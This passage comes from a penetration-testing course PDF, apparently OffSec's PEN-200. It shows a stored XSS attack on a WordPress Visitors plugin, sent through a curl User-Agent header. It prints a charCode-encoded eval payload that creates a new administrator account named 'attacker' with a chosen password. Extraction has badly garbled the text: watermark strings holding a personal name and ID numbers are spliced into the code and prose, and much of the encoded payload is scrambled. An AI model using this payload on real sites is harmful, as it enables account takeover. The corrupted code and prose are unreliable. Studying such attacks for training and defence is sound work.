+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                               259
+                                                                                                                                                         Penetration Testing with Kali Linux
+
+                               Figure 117: Minifying the XSS attack code
+
+After clicking Compress JavaScript, we'll copy and locally save the minified output.
+
+As a final step, we'll encode  the  minified  JavaScriptWhciotdleo,wso    any                                                                            bad  characters  won't  interfere
+with sending the payload.
+
+Wfuencctainondoetnhcivosadures_iitnnogp_ujthtaev=afsosclltroriwipintng(gsfturnicntgi)on{:Jeffrey
+                fvoarr(i<opcfuor(st>ppooou=usuttt0pp!=;uu=ttp'(o'+i+;sO==nSp<-"iu5,tni77"p.n5;ulp2etu1n.t9cg.0htlahernCg-otdh1e;)A)tp(o{pso+s+));<{/cr>
+
+                             }
+
+   }
+
+   return output;
+
+}
+
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+
+                                                      Listing 141 - JS Encoding JS Function
+
+The encode_to_javascript function will parse the minified JS string parameter and convert each
+character into the corresponding UTF-16 integer code using the charCodeAt method.
+
+Let's run the function from the browser's console.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                         260
+                                                                          Penetration Testing with Kali Linux
+
+                                      Figure 118: Encoding the Minified JS with the Browser Console
+
+We are going to decode and execute the encoded string by first decoding the string with the
+sfrtorimngC,hwaerCcoadneinmseetrht oitdw, tithhetnherufnonllionwginitgvciaurtlhceoemvaml(a)Wnhmidtealtnohwdodla. uOnncchethweeahttaavcek:copied the encoded
+1"k,1a6<,sl1ic67@,1r,1ikpa01tl11i0,>,:1e~1v1a$05l,11,<(cS11ut61r9>,c8,iu53n2r,g,8l.8f28,r-o,7i7m6C,7h,h6t71at,6rpC,3:4o7/d2,/4,eo(71f1,1f161s,81e1,9c91,wJ761pe,1,f121-f1,1-r244ue,5,sy,38e292r,,7-,19a170g,10e01,n01,t116,03,997,11,1710,250,10,1181,20,,1141705,,1,11111671,,3,411145,1,1711,410,01,11,10111,415,1,14513
+,18,1112101,14,511,03,,0001114,0,,1164310,1,281,3,451,1119,118,,8457,26,99,71,7,11,061111,24,08,4,18,911,570314,1,3,1,7111,41164190,,2,4341,O126,3S,,,46-411,1541,1477,30415,4,,92,1171141,119102010,0,,,169110111,911,0,,,979,411,19113002,,,104094,,89109,3,,23,1,7404172,,0197,1,6,17821,3,1,16,9341106,1,,11,81,49391,74,,30,431417,0,041,1401,,4011,611,31115,,,1245,0191,10,1,606911,714,1,,114160,,171136,11,1,19051,1,75,9,719011,11,021100,,101,
+
+1,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,
+114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110
+,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110
+,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,1
+01,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,
+95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116
+,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61
+,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,
+107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97
+,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77
+,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,
+34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117
+,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,
+111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,11
+1,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,1
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  261
+                                                                                                                              Penetration Testing with Kali Linux
+
+00,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,
+97,109,115,41,59))</script>" --proxy 127.0.0.1:8080</cu>
+
+                                          Listing 142 - Launching the Final XSS Attack through Curl
+
+Before running the curl attack command, let's start Burp and leave Intercept on.
+We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing
+our malicious payload, then forward it to our Burp instance so we can inspect it further.
+After running the curl command, we can inspect the request in Burp.
+
+                                                                               Whitlow
+
+                             Jeffrey
+
+Everything  seems  correct,  soOSlF-ei5gt7'us7re5f21o11r99w:0Iansrpdectthineg  the Attack  in Burp       Forward,  then  disabling
+
+                                                                               request      by clicking
+
+Intercept.
+
+At this point, our XSS exploit should have been stored in the WordPress database. We only need
+to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the
+Visitors plugin dashboard on the bottom left.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                 262
+                                                                          Penetration Testing with Kali Linux
+
+                       Figure 120: Loading Visitors Statistics
+
+We notice that only one entry is present,  oaunrdaattpapcakreeWnmhtlibytelndoodweUdseinr-tAog"e<nstcrhipats>b" etaegnsr,escoortdheedb.rTohwisseisr
+because the User-Agent field contained
+cannot render any string from it.             mhJaeevfnefureoexynecthueteldeftthpeamnea.licious
+
+By loading the plugin  statistics, we should                                                     script,  so  let's  verify  if  our
+attack succeeded by    clicking on the Users
+
+                       OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                         263
+                                                                          Penetration Testing with Kali Linux
+
+EM8WWadx.oeocm5drecdiulnolPleWeiursn.eltdtrsr!asantToopphrwluipbsgayiindnXlevSgwvaSeniturchafepglaaionnwugeramaaFlctilbgotOreuaaSwrdc-feetkd5e1d7e2da7d1n5H:u2dCwsT1oeg9Tnb0fatPiorimsnJrheeienafqegscflulctcr.heaeeaWslystatose.tWue'lhtrloiAcpttottlrahivocveewkilreSuwguncedecsebeerldsfyerhiodnemgllshomasotsrbteaynincd-radarefdtpinthugsianercauntosottohamenr
+
+In this Module, we focused on the identification and enumeration of common web application
+vulnerabilities. We exploited vulnerabilities such as API misconfigurations and XSS.
+
+We concluded the Module by leveraging an XSS vulnerability to gain administrative privileges on a
+vulnerable web application via a specially crafted HTTP request.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  264
+
